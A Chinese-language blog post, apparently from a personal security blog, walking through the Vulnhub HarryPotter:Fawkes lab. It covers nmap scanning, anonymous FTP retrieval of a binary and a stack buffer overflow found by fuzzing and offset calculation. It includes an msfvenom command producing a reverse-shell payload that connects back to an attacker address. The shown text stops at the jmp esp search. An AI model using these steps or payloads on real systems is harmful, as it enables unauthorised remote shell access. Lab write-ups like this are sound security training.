@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/icon_32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/icon_16.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"hdfzzf.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="该靶机难度为高，主要的难点在于缓冲区溢出漏洞的利用以及堆溢出漏洞攻击。其次在于FTP服务攻击和流量抓包分析，这两者在之前的靶机中从没遇到过。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="12 Vulnhub HarryPotterFawkes Writeup">
+<meta property="og:url" content="https://hdfzzf.github.io/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/index.html">
+<meta property="og:site_name" content="HDFZZF&#39;s BLOG">
+<meta property="og:description" content="该靶机难度为高，主要的难点在于缓冲区溢出漏洞的利用以及堆溢出漏洞攻击。其次在于FTP服务攻击和流量抓包分析，这两者在之前的靶机中从没遇到过。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416151956.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152011.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152214.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152340.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416153338.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416153531.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154319.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154459.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154637.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416155246.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416155927.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416160325.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416162156.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416163915.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416164843.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416164946.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170120.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170549.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416170810.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416171405.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416173101.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416175319.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416175507.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416193905.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416194156.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416194714.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416195127.png">
+<meta property="article:published_time" content="2022-04-15T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-04-16T12:19:26.402Z">
+<meta property="article:author" content="hdfzzf">
+<meta property="article:tag" content="综合">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="FTP服务攻击">
+<meta property="article:tag" content="流量抓包分析">
+<meta property="article:tag" content="堆溢出漏洞攻击:CVE-2021-3156">
+<meta property="article:tag" content="缓冲区溢出漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416151956.png">
+
+
+<link rel="canonical" href="https://hdfzzf.github.io/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hdfzzf.github.io/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/","path":"2022/04/16/12 Vulnhub HarryPotterFawkes Writeup/","title":"12 Vulnhub HarryPotterFawkes Writeup"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>12 Vulnhub HarryPotterFawkes Writeup | HDFZZF's BLOG</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+  <a target="_blank" rel="noopener" href="https://github.com/hdfzzf" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">HDFZZF's BLOG</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">1 靶机信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">2.</span> <span class="nav-text">2 渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="nav-number">2.1.</span> <span class="nav-text">2.1 主机发现、端口扫描、端口服务发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="nav-number">2.2.</span> <span class="nav-text">2.2 访问http服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEftp%E6%9C%8D%E5%8A%A1"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 访问ftp服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 缓冲区溢出漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.4.1.</span> <span class="nav-text">2.4.1 查找漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.4.2.</span> <span class="nav-text">2.4.2 利用漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.5.</span> <span class="nav-text">2.5 信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">2.6.</span> <span class="nav-text">2.6 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">3 总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#aslr%E6%8A%80%E6%9C%AF"><span class="nav-number">3.1.</span> <span class="nav-text">3.1 ASLR技术</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="hdfzzf"
+      src="/images/zzf.jpg">
+  <p class="site-author-name" itemprop="name">hdfzzf</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">56</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">78</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/hdfzzf" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;hdfzzf" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:dfhong1998@163.com" title="E-Mail → mailto:dfhong1998@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hdfzzf.github.io/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/zzf.jpg">
+      <meta itemprop="name" content="hdfzzf">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="HDFZZF's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          12 Vulnhub HarryPotterFawkes Writeup
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-04-16 00:00 / 修改时间：20:19" itemprop="dateCreated datePublished" datetime="2022-04-16T00:00:00+08:00">2022-04-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus：</span>
+    
+    <a title="disqus" href="/2022/04/16/12%20Vulnhub%20HarryPotterFawkes%20Writeup/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/04/16/12 Vulnhub HarryPotterFawkes Writeup/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>7.3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>7 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>该靶机难度为高，主要的难点在于缓冲区溢出漏洞的利用以及堆溢出漏洞攻击。其次在于FTP服务攻击和流量抓包分析，这两者在之前的靶机中从没遇到过。</p>
+<span id="more"></span>
+<h1 id="靶机信息">1 靶机信息</h1>
+<p>靶机地址：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/harrypotter-fawkes,686/">HarryPotter:Fawkes</a></li>
+<li>这是一个系列的靶机，漏洞都非常的奇特！</li>
+</ul>
+<p>难度：</p>
+<ul>
+<li>高</li>
+</ul>
+<p>目标：</p>
+<ul>
+<li><p>取得2个root权限</p></li>
+<li><p>拿到3个Flag</p></li>
+</ul>
+<p>涉及攻击方法：</p>
+<ul>
+<li>主机发现</li>
+<li>端口扫描</li>
+<li>web信息收集</li>
+<li><strong>FTP服务攻击</strong></li>
+<li><strong>缓冲区溢出</strong></li>
+<li><strong>模糊测试</strong></li>
+<li>漏洞利用代码编写</li>
+<li><strong>流量抓包分析</strong></li>
+<li><strong>堆溢出漏洞攻击</strong></li>
+<li>Metasploit（MSF）</li>
+<li>手动修复EXP代码</li>
+<li>本地提权</li>
+</ul>
+<p>参考资料：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/worawit/CVE-2021-3156">CVE-2021-3156</a></li>
+<li>https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</li>
+</ul>
+<h1 id="渗透">2 渗透</h1>
+<h2 id="主机发现端口扫描端口服务发现">2.1 主机发现、端口扫描、端口服务发现</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.16</span><br><span class="line">sudo nmap -p21,22,80,2222,9898 -A 10.0.2.16</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416151956.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152011.png" /></p>
+<p>信息如下：</p>
+<ul>
+<li>21端口的服务是ftp，版本为vsfttpd 3.0.3，可以匿名登录，并且存在一个文件<code>server_hogwarts</code></li>
+<li>22端口的服务是ssh，版本是OpenSSH 7.9，</li>
+<li>80端口的服务是http，版本为Apache 2.4.38</li>
+<li>2222端口的服务也是ssh，版本为OpenSSH 2.4.38</li>
+<li>9898端口的服务未知，所以随便给了一个monkeycom</li>
+<li>靶机的操作系统为Debian</li>
+</ul>
+<h2 id="访问http服务">2.2 访问http服务</h2>
+<p>直接访问80端口，发现这个网页非常的刚进，只有一张图片。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152214.png" /></p>
+<p>因此尝试进行路径扫描，也没有什么有用的发现</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416152340.png" /></p>
+<h2 id="访问ftp服务">2.3 访问ftp服务</h2>
+<p>在http上没有有用的发现，接下来直接利用ftp匿名登录上去，并下载对应的那个文件。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.0.2.16 21</span><br><span class="line">用户名输入：anonymous</span><br><span class="line">密码为空，直接enter</span><br></pre></td></tr></table></figure></p>
+<p>登录进去之后，利用<code>get server_hogwarts</code>下载对应文件到本地，接下来我想查看一下其他目录的东西，发现除了下载对应的文件，不能进行任何操作。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416153338.png" /></p>
+<h2 id="缓冲区溢出漏洞">2.4 缓冲区溢出漏洞</h2>
+<p>到目前为止，http服务没信息，ssh没有用户和密码，9898都不知道什么服务，只有刚刚下载的一个文件，先查看一下文件类型</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file server_hogwarts</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416153531.png" /></p>
+<p>信息：</p>
+<ul>
+<li>该文件是一个二进制的可执行文件（elf是Linux的可执行文件格式），并且是32位的</li>
+<li>说明对方系统是能够运行32位的软件，即<code>x86</code>架构</li>
+</ul>
+<p>首先执行这文件看一下会发生什么，结果是无事发生，查看进程是否存在对应的进程，发现确实存在</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154319.png" /></p>
+<p>查看其所在的端口</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154459.png" /></p>
+<p>发现开了9898端口，联想到端口扫描的时候，靶机上也开了9898端口，因此，靶机上的9898端口对应的服务应该就是这个。现在本地用nc连接上看一下该服务的功能。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416154637.png" /></p>
+<p>功能非常简单，我们输入对应的字符串，服务返回对应的字符串，就一个功能点。连接靶机的9898端口，发下功能是一摸一样的，接下来只能通过查看该文件是否存在缓冲区溢出漏洞来判断靶机上也存在相应的漏洞。</p>
+<p>在测试之前，需要先把aslr关掉。</p>
+<blockquote>
+<p>该技术简单来说就是每次启用程序的时候的内存地址总是随机的，这样子即使存在缓冲区溢出漏洞，也会因为每次启动程序的地址不同导致第一次出现漏洞的地址A和第二次出现漏洞的地址B不同，使得即使存在漏洞也无法利用。</p>
+</blockquote>
+<p>查看是否开启：（0是禁用；1，2表示开启，2是在1的基础上进一步打开堆地址随机化）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416155246.png" /></p>
+<p>输入以下命令禁用： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo root <span class="comment"># 需要先切换到root才可以，否则权限不够</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p>
+<p>利用图形化工具edb-debugger进行查找。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install edb-debugger <span class="comment"># 安装</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="查找漏洞">2.4.1 查找漏洞</h3>
+<p>生成一个300个A的字符串，然后输入到唯一的功能点中，发现edb-debugger提示出错了</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416155927.png" /></p>
+<p>说明这里确实存在漏洞，接下来生成不重复的字符串判断一下是哪几个A出现在了EIP寄存器中。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l 300</span><br><span class="line"></span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416160325.png" /></p>
+<p>此时EIP中的值为<code>64413764</code>，即<code>d7Ad</code>（注意需要反过来），然后查找该子串在原来字符串中的偏移量 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_offset</span><br><span class="line"></span><br><span class="line">Exact match at offset 112</span><br></pre></td></tr></table></figure></p>
+<p>生成字符串确定一下： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;print(&#x27;A&#x27;*112 + &#x27;hdfs&#x27; + &#x27;C&#x27;*50)&quot;</span></span><br><span class="line"></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhdfsCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416162156.png" /></p>
+<p>成功找到漏洞所在。那么该如何利用呢？这里不像之前，不存在有漏洞的函数可以利用。首先得知道一个基础知识：</p>
+<blockquote>
+<ol type="1">
+<li>EIP寄存器里存储的是CPU下次要执行的指令的地址；</li>
+<li>EBP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。</li>
+<li>ESP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</li>
+</ol>
+</blockquote>
+<p>（我对汇编不熟悉）简单说下我的理解：如果存在漏洞的函数，可以讲EIP中的值修改为对应函数的地址，然后CPU就会自动执行存在漏洞的函数。像该靶机，不存在漏洞函数，可以通过EIP让CPU执行ESP寄存器中的指令，即寻找<code>jmp esp</code>指令。我们提前在ESP中写入反弹shell的指令（可以用msf生成）。</p>
+<h3 id="利用漏洞">2.4.2 利用漏洞</h3>
+<p>从查找漏洞的过程来看，ESP寄存器是可写入的，并且会将EIP之后的内容（即hdfs之后的内容）全部写入ESP。因此，我们先利用msf生成反弹shell的指令： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 -b <span class="string">&quot;\x00&quot;</span> -f py <span class="comment"># 生成python可利用的</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416163915.png" /></p>
+<p>然后查找<code>jmp esp</code>指令的地址，利用<code>Plugins-&gt;Opcode Search</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416164843.png" /></p>
